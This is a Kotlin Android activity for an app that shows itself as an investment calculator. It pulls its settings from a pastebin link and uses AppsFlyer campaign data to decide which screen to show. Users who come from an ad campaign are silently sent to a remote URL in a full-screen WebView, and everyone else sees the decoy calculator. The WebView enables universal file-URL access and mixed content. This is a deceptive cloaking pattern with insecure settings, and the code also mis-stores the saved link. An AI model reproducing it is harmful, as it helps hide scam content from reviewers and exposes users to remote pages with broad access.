package com.brbadenka.activnoeble

import android.animation.ValueAnimator
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.os.Bundle
import android.util.Log
import android.view.View
import android.view.ViewGroup
import android.view.animation.AccelerateDecelerateInterpolator
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.TextView
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import com.airbnb.lottie.LottieAnimationView
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.onesignal.OneSignal
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {
    private lateinit var weranda: WebView
    private var blockerAppsFlyer = 0
    private var apiUrl: String = ""
    private var devKey: String = ""
    private var os: String = ""
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val rootLayout = findViewById<androidx.constraintlayout.widget.ConstraintLayout>(R.id.main)
        val gradientDrawable = GradientDrawable(
            GradientDrawable.Orientation.TOP_BOTTOM,
            intArrayOf(
                Color.parseColor("#008AAC"),
                Color.parseColor("#00F12B")
            )
        )

        //rootLayout.background = gradientDrawable
        val lottieAnimationView = findViewById<LottieAnimationView>(R.id.lottie_animation_view)
        lottieAnimationView.playAnimation()
        weranda = findViewById(R.id.wera)
        val checkFor = getSharedPreferences("balance", Context.MODE_PRIVATE)
        val getShared = saveGet(checkFor)

        weranda.apply {
            settings.allowFileAccessFromFileURLs = true
            settings.allowContentAccess = true
            settings.javaScriptEnabled = true
            settings.javaScriptCanOpenWindowsAutomatically = true
            settings.allowFileAccess = true
            settings.mixedContentMode = 0
            settings.useWideViewPort = true
            settings.allowUniversalAccessFromFileURLs = true
            settings.loadWithOverviewMode = true
            settings.domStorageEnabled = true
            settings.databaseEnabled = true
        }

        weranda.webViewClient = WerandaSett(weranda)

        if (getShared == null || getShared == "empty") {
            fetchDataFromPastebin("https://pastebin.com/raw/7xuEVtmG", checkFor)
        } else {
            weranda.visibility = View.VISIBLE
            weranda.loadUrl(getShared)
        }
    }
    private fun fetchDataFromPastebin(pastebinUrl: String, sharedPreferences: SharedPreferences) {
        thread {
            try {
                Log.d("MY_TAG", "Requesting URL: $pastebinUrl")

                val url = URL(pastebinUrl)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.setRequestProperty("User-Agent", "Mozilla/5.0")

                val responseCode = connection.responseCode
                Log.d("MY_TAG", "Response Code: $responseCode")

                if (responseCode == HttpURLConnection.HTTP_OK) {
                    val reader = BufferedReader(InputStreamReader(connection.inputStream))
                    val response = StringBuilder()
                    var line: String?

                    while (reader.readLine().also { line = it } != null) {
                        response.append(line)
                    }
                    reader.close()

                    Log.d("MY_TAG", "Response body: ${response.toString()}")

                    val jsonResponse = JSONObject(response.toString())
                    devKey = jsonResponse.getString("devKey")
                    apiUrl = jsonResponse.getString("apiUrl")
                    //os = jsonResponse.getString("osKey")
                    Log.d("MY_TAG", "Response body: APS: $devKey LINKA: $apiUrl ONESING: $os")
                    startAppsFlyerLogic(devKey, sharedPreferences)
                } else {
                    Log.e("MY_TAG", "Failed to fetch data. Response code: $responseCode")
                    load()
                    val errorStream = connection.errorStream
                    if (errorStream != null) {
                        val errorReader = BufferedReader(InputStreamReader(errorStream))
                        val errorResponse = StringBuilder()
                        var errorLine: String?

                        while (errorReader.readLine().also { errorLine = it } != null) {
                            errorResponse.append(errorLine)
                        }
                        errorReader.close()
                        Log.e("MY_TAG", "Error body: ${errorResponse.toString()}")
                    }

                    load()
                }
                connection.disconnect()
            } catch (e: Exception) {
                Log.e("MY_TAG", "Error fetching data: ${e.message}")
                load()
            }
        }
    }

    private fun saveGet(checker: SharedPreferences): String? {
        return checker.getString("valueInSharedPreferences", "empty")
    }


    private fun startAppsFlyerLogic(devKey: String, sharedPreferences: SharedPreferences) {
        AppsFlyerLib.getInstance().init(devKey, object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
                Log.d("MY_TAG", "Conversion Data Success")
                if (blockerAppsFlyer == 0) {
                    blockerAppsFlyer = 1
                    if (appfMap != null && appfMap.isNotEmpty()) {
                        val campaign = appfMap["campaign"] as? String
                        val afAd = appfMap["af_ad"] as? String
                        val media    = appfMap["media_source"] as? String
                        Log.d("MY_TAG", "Campaign: $campaign, Ad: $afAd")

                        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(applicationContext)

                            val link = "$apiUrl?xeslukjf=${campaign}&sqdqklbs=${afAd}&ktzxns=${media}&szcwpho=$afId"
                            sharedPreferences.edit().putString("getKey", link).apply()
                            Log.d("MY_TAG", "Generated link: $link")
                            //OneSignal.initWithContext(this@MainActivity, os)
                            //OneSignal.login(campaign)

                            Log.d("MY_TAG", "OS DONE")
                            CoroutineScope(Dispatchers.Main).launch {
                                //OneSignal.Notifications.requestPermission(false)
                                weranda.visibility = View.VISIBLE
                                weranda.loadUrl(link)

                            }

                    } else {
                        Log.d("MY_TAG", "Attribution data is empty, opening game")
                        load()
                    }
                }
            }

            override fun onConversionDataFail(error: String?) {
                Log.e("MY_TAG", "Conversion Data Fail: $error")
                handleErrorAndRedirect()
                if (blockerAppsFlyer == 0) {
                    blockerAppsFlyer = 1
                    load()
                }
            }

            override fun onAppOpenAttribution(data: MutableMap<String, String>?) {}
            override fun onAttributionFailure(error: String?) {}
        }, this)
        AppsFlyerLib.getInstance().start(this)
    }

    private fun handleErrorAndRedirect() {
        CoroutineScope(Dispatchers.Main).launch {
            load()
        }
    }


    private fun load() {
        runOnUiThread {


            replaceImage(1000)
        }
    }
    private fun load2(){
        val intent = Intent(this, MainActivity2::class.java)
        startActivity(intent)
        finish()
    }
    private fun animateHeight(view: TextView, startHeight: Int, endHeight: Int) {
        val animator = ValueAnimator.ofInt(startHeight, endHeight)
        animator.duration = 1000
        animator.interpolator = AccelerateDecelerateInterpolator()

        animator.addUpdateListener { animation ->
            val newHeight = animation.animatedValue as Int
            val layoutParams = view.layoutParams
            layoutParams.height = newHeight
            view.layoutParams = layoutParams
        }

        animator.start()
    }

    private fun replaceImage(delay: Long) {
        val gotovo = findViewById<TextView>(R.id.gotovo)
        val lottie = findViewById<LottieAnimationView>(R.id.lottie_animation_view)

        gotovo.postDelayed({
            lottie.visibility = View.INVISIBLE
            gotovo.text = "Оптимизируйте свои инвестиции и достигайте максимальных результатов автоматически"
            animateHeight(gotovo, gotovo.layoutParams.height, gotovo.layoutParams.height + 600)

            gotovo.postDelayed({
                gotovo.text = "Введите срок, сумму \n" +
                        "и процентную ставку \n" +
                        "в калькулятор, чтобы мгновенно узнать размер вашей прибыли"
                animateHeight(gotovo, gotovo.layoutParams.height, gotovo.layoutParams.height + 200)

                gotovo.postDelayed({
                    val intent = Intent(this, MainActivity2::class.java)
                    startActivity(intent)
                    finish()
                }, 4000)

            }, 4000)

        }, delay)
    }


    inner class WerandaSett(val weras: WebView) : WebViewClient() {
        override fun onPageStarted(views: WebView?, url: String?, favicon: Bitmap?) {
            weras.layoutParams = FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
        }

        override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
            val currentUrl = request?.url.toString()
            if (currentUrl.contains("https://utrpirm")) {
                Log.d("MY_TAG","AAAAAA REGECT")
                load2()
                return true
            }
            return false
        }
    }
}